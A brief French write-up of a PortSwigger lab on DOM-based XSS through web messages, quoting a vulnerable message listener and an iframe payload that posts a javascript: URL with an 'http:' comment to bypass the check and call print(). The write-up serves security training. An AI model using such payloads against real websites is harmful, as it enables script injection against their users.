# Lab

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

## Solution

Dans les sources de la page d'accueil on voit ce script :

```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

On a juste à envoyer un payload et mettre une URL javascript qui va appeler la fonction print() et un commentaire contenant `http:` ou `https:` pour valider le contrôle de la source du message.

```html
<iframe src="https://0aec0010035be671833a0fd7009e00af.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print();//http:', '*')">
</iframe>
```